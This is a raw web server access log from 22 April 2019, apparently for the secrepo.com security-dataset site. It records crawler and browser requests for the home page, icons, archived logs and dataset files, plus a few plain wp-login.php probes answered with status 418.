35.224.4.53 - - [22/Apr/2019:04:32:33 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554487 "-" "ltx71 - (http://ltx71.com/)" 
217.132.55.48 - - [22/Apr/2019:04:42:11 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
216.244.66.245 - - [22/Apr/2019:04:45:58 -0700] "GET /self.logs/error.log.2019-04-12.gz HTTP/1.1" 200 4113 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [22/Apr/2019:04:46:01 -0700] "GET /self.logs/error.log.2019-04-13.gz HTTP/1.1" 200 4620 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
103.79.100.146 - - [22/Apr/2019:04:46:49 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.79.100.146 - - [22/Apr/2019:04:46:49 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.79.100.146 - - [22/Apr/2019:04:46:50 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.79.100.146 - - [22/Apr/2019:04:46:50 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.79.100.146 - - [22/Apr/2019:04:46:50 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.79.100.146 - - [22/Apr/2019:04:46:50 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.79.100.146 - - [22/Apr/2019:04:46:52 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
207.46.13.134 - - [22/Apr/2019:04:47:03 -0700] "GET /self.logs/access.log.2017-07-08.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
186.248.165.170 - - [22/Apr/2019:04:48:01 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
186.248.165.170 - - [22/Apr/2019:04:48:03 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
186.248.165.170 - - [22/Apr/2019:04:48:03 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
186.248.165.170 - - [22/Apr/2019:04:48:05 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
222.138.222.76 - - [22/Apr/2019:04:52:17 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
79.69.95.205 - - [22/Apr/2019:04:52:24 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
79.69.95.205 - - [22/Apr/2019:04:52:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
79.69.95.205 - - [22/Apr/2019:04:52:24 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
79.69.95.205 - - [22/Apr/2019:04:52:24 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
113.171.224.176 - - [22/Apr/2019:04:53:04 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.58 - - [22/Apr/2019:04:53:10 -0700] "GET /self.logs/access.log.2018-02-13.gz HTTP/1.1" 200 37985 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
85.250.57.9 - - [22/Apr/2019:04:58:56 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
85.250.57.9 - - [22/Apr/2019:04:58:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
85.250.57.9 - - [22/Apr/2019:04:58:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
85.250.57.9 - - [22/Apr/2019:04:58:58 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
207.46.13.48 - - [22/Apr/2019:04:59:39 -0700] "GET /self.logs/access.log.2017-05-05.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.219 - - [22/Apr/2019:04:59:51 -0700] "GET /self.logs/error.log.2018-04-22.gz HTTP/1.1" 200 4278 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.79.77 - - [22/Apr/2019:05:01:43 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
207.46.13.48 - - [22/Apr/2019:05:02:45 -0700] "GET /self.logs/access.log.2017-06-28.gz HTTP/1.1" 200 31207 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
200.84.130.161 - - [22/Apr/2019:05:03:07 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
200.84.130.161 - - [22/Apr/2019:05:03:07 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.69.95.205 - - [22/Apr/2019:05:03:19 -0700] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 1539 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
79.69.95.205 - - [22/Apr/2019:05:03:19 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0" 
157.55.39.58 - - [22/Apr/2019:05:10:55 -0700] "GET /self.logs/ HTTP/1.1" 200 16034 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
147.0.108.174 - - [22/Apr/2019:05:17:31 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
147.0.108.174 - - [22/Apr/2019:05:17:31 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
147.0.108.174 - - [22/Apr/2019:05:17:31 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
147.0.108.174 - - [22/Apr/2019:05:17:32 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
185.68.223.5 - - [22/Apr/2019:05:18:37 -0700] "GET / HTTP/1.1" 200 46424 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
213.249.37.226 - - [22/Apr/2019:05:30:47 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
213.249.37.226 - - [22/Apr/2019:05:30:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
213.249.37.226 - - [22/Apr/2019:05:30:48 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
213.249.37.226 - - [22/Apr/2019:05:30:48 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
92.156.62.27 - - [22/Apr/2019:05:32:24 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
159.203.99.69 - - [22/Apr/2019:05:34:53 -0700] "GET / HTTP/1.1" 200 12511 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:03 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14" 
159.203.99.69 - - [22/Apr/2019:05:35:08 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:08 -0700] "GET /data HTTP/1.1" 404 340 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:08 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:08 -0700] "GET / HTTP/1.1" 200 12511 "http://secrepo.com/" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:09 -0700] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:08 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:09 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 1909362 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:09 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 3124082 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
159.203.99.69 - - [22/Apr/2019:05:35:08 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 10341043 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
40.77.167.192 - - [22/Apr/2019:05:36:16 -0700] "GET /self.logs/access.log.2019-04-17.gz HTTP/1.1" 200 33767 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
182.61.136.202 - - [22/Apr/2019:05:36:42 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
182.61.136.202 - - [22/Apr/2019:05:36:42 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
182.61.136.202 - - [22/Apr/2019:05:36:42 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
35.224.4.53 - - [22/Apr/2019:05:39:00 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "ltx71 - (http://ltx71.com/)" 
35.224.4.53 - - [22/Apr/2019:05:40:03 -0700] "GET /pe_static/op-cleaver.zip HTTP/1.1" 200 710028 "-" "ltx71 - (http://ltx71.com/)" 
40.77.167.203 - - [22/Apr/2019:05:41:14 -0700] "GET /self.logs/error.log.2019-04-18.gz HTTP/1.1" 200 4731 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.209 - - [22/Apr/2019:05:41:18 -0700] "GET /self.logs/error.log.2019-04-19.gz HTTP/1.1" 200 4971 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
37.146.77.40 - - [22/Apr/2019:05:42:57 -0700] "GET / HTTP/1.1" 200 12511 "https://yandex.ru/clck/jsredir?from=yandex.ru%3Bsearch%3Bweb%3B%3B&text=&etext=2063.qOzIauIUZTK7bduALdjhwxMbbZPyPc4nebSkg8bOT1aVXqjVaPpLtngB4IsostWP.52bdb46fb34324bab4e778d7eca456e6acd0a20b&uuid=&state=_BLhILn4SxNIvvL0W45KSic66uCIg23qh8iRG98qeIXmeppkgUc0YD4hgzqAYr5iuWBiLZQy-rY&data=UlNrNmk5WktYejR0eWJFYk1LdmtxdFVvX2JPZzkyaEU2WFNsdVNGUmVZbU91UHlqSWwyc08wTXNSWFdZdGZzeklaZGlucTZXU19lMFNKWi1SUkJYcWtGUEl6a1RmMzBvUUpSMXU2UkwzSDQ&b64e=2&sign=04359247dcbd35b678874d7391e6afc6&keyno=0&cst=AiuY0DBWFJ7IXge4WdYJQYuwSQLovbTTkq_meeiz6Er4tK-i8h4QJYoZ__0DGcbb-q2Y-n5Fme3DX2XX9508V1qfoz2Pa6cCrya7TVNPc3bNzVe04lcTt9Yu_589tDJ83vvp4NJCMTBEXfMfJcJO8iFpP14yKSA2&ref=orjY4mGPRjk5boDnW0uvlrrd71vZw9kp5uQozpMtKCXEfKO1imoOE5ETCWykfOywRScJYAQujE7envNmqmWruUogc8kris4JF-SXMsxhP5PKkDAe1KlKnA&l10n=ru&cts=1555936977302&mc=5.24114944763" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.116" 
37.146.77.40 - - [22/Apr/2019:05:42:58 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.116" 
37.146.77.40 - - [22/Apr/2019:05:42:58 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.116" 
207.46.13.134 - - [22/Apr/2019:05:48:56 -0700] "GET /self.logs/2015/ HTTP/1.1" 200 7437 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.58 - - [22/Apr/2019:05:52:17 -0700] "GET /self.logs/error.log.2018-03-20.gz HTTP/1.1" 200 4575 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
145.62.64.102 - - [22/Apr/2019:05:54:29 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" 
145.62.64.102 - - [22/Apr/2019:05:54:29 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" 
145.62.64.102 - - [22/Apr/2019:05:54:29 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" 
145.62.64.102 - - [22/Apr/2019:05:54:30 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" 
113.171.224.176 - - [22/Apr/2019:05:56:15 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
100.43.90.103 - - [22/Apr/2019:06:04:22 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [22/Apr/2019:06:04:25 -0700] "GET /self.logs/?C=N;O=A HTTP/1.1" 200 16034 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
194.147.35.48 - - [22/Apr/2019:06:07:19 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
194.147.35.48 - - [22/Apr/2019:06:07:24 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
194.147.35.48 - - [22/Apr/2019:06:07:25 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
194.147.35.48 - - [22/Apr/2019:06:07:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
207.46.13.219 - - [22/Apr/2019:06:09:55 -0700] "GET /self.logs/access.log.2017-10-19.gz HTTP/1.1" 200 50928 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
154.0.162.183 - - [22/Apr/2019:06:12:48 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279381 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
113.247.20.214 - - [22/Apr/2019:06:24:51 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36" 
71.121.210.35 - - [22/Apr/2019:06:27:19 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
71.121.210.35 - - [22/Apr/2019:06:27:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
71.121.210.35 - - [22/Apr/2019:06:27:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
209.190.207.10 - - [22/Apr/2019:06:29:33 -0700] "GET / HTTP/1.1" 304 133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
207.46.13.134 - - [22/Apr/2019:06:29:33 -0700] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 552 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
23.100.232.233 - - [22/Apr/2019:06:31:42 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)" 
202.178.123.102 - - [22/Apr/2019:06:33:28 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36" 
207.46.13.134 - - [22/Apr/2019:06:50:28 -0700] "GET /self.logs/access.log.2018-01-04.gz HTTP/1.1" 200 25376 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
89.31.126.15 - - [22/Apr/2019:06:50:51 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
89.31.126.15 - - [22/Apr/2019:06:50:53 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
89.31.126.15 - - [22/Apr/2019:06:50:54 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
89.31.126.15 - - [22/Apr/2019:06:50:54 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
89.31.126.15 - - [22/Apr/2019:06:51:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
216.244.66.245 - - [22/Apr/2019:06:52:50 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
134.41.201.91 - - [22/Apr/2019:06:54:14 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
134.41.201.91 - - [22/Apr/2019:06:54:14 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.41.201.91 - - [22/Apr/2019:06:54:14 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.41.201.91 - - [22/Apr/2019:06:54:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.41.201.91 - - [22/Apr/2019:06:54:14 -0700] "GET / HTTP/1.1" 200 12510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
134.41.201.91 - - [22/Apr/2019:06:54:15 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.41.201.91 - - [22/Apr/2019:06:54:15 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
134.41.201.91 - - [22/Apr/2019:06:54:15 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/14607.1.40.1.4 CFNetwork/978.0.7 Darwin/18.5.0 (x86_64)" 
71.121.210.35 - - [22/Apr/2019:06:55:44 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
71.121.210.35 - - [22/Apr/2019:06:55:44 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
71.121.210.35 - - [22/Apr/2019:06:55:44 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
41.223.160.131 - - [22/Apr/2019:06:57:41 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
